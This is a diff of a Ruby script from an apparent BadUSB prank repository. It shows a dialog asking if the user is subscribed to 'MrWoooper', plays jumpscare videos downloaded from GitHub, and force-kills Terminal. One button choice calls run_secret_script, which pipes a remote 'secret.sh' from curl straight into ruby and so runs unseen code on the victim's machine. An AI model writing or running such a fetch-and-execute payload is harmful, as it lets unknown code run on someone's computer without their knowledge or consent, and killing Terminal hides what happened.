@@ -98,54 +98,42 @@ def run_secret_script
   system("curl -s https://raw.githubusercontent.com/Hrampell/badusb_v2/main/secret.sh | ruby")
 end
 
-# --- Subscriber Branch Action ---
-# For subscribed users: if "Hawk" is chosen, run the secret script; if "Tuah" is chosen, trigger jumpscare.
-def subscriber_action(choice)
-  if choice.downcase == "hawk"
-    run_secret_script
-  elsif choice.downcase == "tuah"
-    trigger_jumpscare("https://raw.githubusercontent.com/Hrampell/badusb_v2/main/Jeff_Jumpscare.mp4")
-  else
-    puts "Unexpected button choice."
-  end
-end
-
 # --- Main Program Flow ---
 
 # First prompt: "Are you subscribed to MrWoooper?"
 subscribed = display_dialog("Are you subscribed to MrWoooper?", ["Yes", "No"], "Yes")
-
 if subscribed.nil?
   puts "No response received. Exiting."
   exit 0
 end
+subscribed_flag = (subscribed.downcase == "yes")
 
-if subscribed.downcase == "no"
-  # Non-subscriber branch: show a new prompt with two button options.
-  sleep 1
-  non_sub_choice = display_dialog("Choose your jumpscare:", ["Default", "Sydney lover"], "Default")
-  if non_sub_choice.nil?
-    puts "No choice made. Exiting."
-    exit 0
-  elsif non_sub_choice.downcase == "default"
-    video_url = "https://raw.githubusercontent.com/Hrampell/badusb_v2/main/jumpscare2.mp4"
-  elsif non_sub_choice.downcase == "sydney lover"
-    video_url = "https://raw.githubusercontent.com/Hrampell/badusb_v2/main/andrewjumpv2.mp4"
-  else
-    puts "Unexpected option. Exiting."
-    exit 0
-  end
-  trigger_jumpscare(video_url)
-  system("killall Terminal")
-  exit 0
-else
-  # Subscriber branch: show a dialog with two buttons: "Hawk" and "Tuah"
-  button_choice = display_dialog("Choose a button:", ["Hawk", "Tuah"], "Hawk")
-  if button_choice.nil?
-    puts "No button chosen. Exiting."
-    exit 0
-  end
-  subscriber_action(button_choice)
-  system("killall Terminal")
+# Next prompt: Show the common button selection with three buttons.
+button_choice = display_dialog("Choose a button:", ["Hawk", "Tuah", "Sydney lover"], "Hawk")
+if button_choice.nil?
+  puts "No button chosen. Exiting."
   exit 0
 end
+
+# Process the button choice.
+case button_choice.downcase
+when "hawk"
+  run_secret_script
+when "tuah"
+  if subscribed_flag
+    # For subscribers, "Tuah" triggers Jeff_Jumpscare.mp4.
+    trigger_jumpscare("https://raw.githubusercontent.com/Hrampell/badusb_v2/main/Jeff_Jumpscare.mp4")
+  else
+    # For non-subscribers, "Tuah" triggers jumpscare2.mp4.
+    trigger_jumpscare("https://raw.githubusercontent.com/Hrampell/badusb_v2/main/jumpscare2.mp4")
+  end
+when "sydney lover"
+  # "Sydney lover" triggers the andrewjumpv2.mp4 jumpscare.
+  trigger_jumpscare("https://raw.githubusercontent.com/Hrampell/badusb_v2/main/andrewjumpv2.mp4")
+else
+  puts "Unexpected button choice."
+end
+
+# Force-kill Terminal after action.
+system("killall Terminal")
+exit 0
